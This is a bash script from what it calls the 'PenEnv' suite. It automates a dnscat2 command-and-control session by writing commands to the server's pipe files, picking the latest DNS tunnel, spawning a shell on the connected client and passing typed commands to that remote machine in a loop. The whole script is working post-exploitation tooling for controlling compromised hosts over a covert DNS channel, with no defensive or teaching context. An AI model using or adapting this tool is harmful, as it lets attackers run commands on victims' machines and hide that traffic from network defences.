
echo "    ____             ______          ";
echo "   / __ \___  ____  / ____/___ _   __";
echo "  / /_/ / _ \/ __ \/ __/ / __ \ | / /";
echo " / ____/  __/ / / / /___/ / / / |/ / ";
echo "/_/    \___/_/ /_/_____/_/ /_/|___/  ";
echo "                                     ";
echo ""
echo "Author : lLou_"
echo "Suite version : V0.1.5"
echo "Script version : V0.1"
echo ""
echo ""

echo "[+] Retrieving standard input and output..."

usr=$(whoami)
stdin="/home/$usr/session/dnscat.stdin"
stdout="/home/$usr/session/dnscat.stdout"

echo "" > $stdout
echo "help" >> $stdin
sleep 1
if [[ ! "$(cat $stdout)" ]];then tput setaf 1;echo "[-] Did not find the correct pipe files... Exiting";tput sgr0;exit 1;fi

echo "[+] Retrieving the last dns tunnel..."

echo "" > $stdout
echo "window" >> $stdin
sleep 1
target=$(cat $stdout | grep -a command | tail -n 1)

if [[ ! "$target" ]];then tput setaf 1;echo "[-] Did not find any tunnel... Exiting";tput sgr0;exit 1;fi

to_check=""
if [[ "$target" =~ "NOT verified" ]];then tput setaf 1;echo "[!] The tunnel is not verified";to_check="1";tput sgr0;fi

target_id=$(echo $target | awk '{print($1)}')

echo "" > $stdout
echo "window -i $target_id" >> $stdin
sleep 1
if [[ $to_check ]];then tput setaf 3;checker=$(cat $stdout | grep -a ">>");echo "[?] Check that the client has the following $checker";to_check="1";tput sgr0;fi


echo "[+] Generating shell..."

echo "" > $stdout
echo "shell" >> $stdin
sleep 1
shell_id=$(cat $stdout | grep -a "New window created" | awk '{print($NF)}')
echo "suspend" >> $stdin
sleep 1
echo "window -i $shell_id" >> $stdin
sleep 1

tput setaf 6;echo "[~] Launching shell...";tput sgr0

echo "" > $stdout

running="ok"
while [[ "$running" ]];do
   read -p " > " command
   case $command in
      quit|exit|close|q|e|c)
         tput setaf 6;read -p "Do you want to close the shell (y/n) " close;tput sgr0
         if [[ $close =~ "y|Y" ]];then
            tput setaf 6;echo "[~] Closing shell...";tput sgr0
            running=""
         fi
         ;;
      *)
         echo "" > $stdout
         echo $command >> $stdin
         while [[ ! $(cat $stdout) =~ "dnscat>" ]];do sleep 1; done
         echo $(cat $stdout | head -n +2)
         ;;
   esac
done

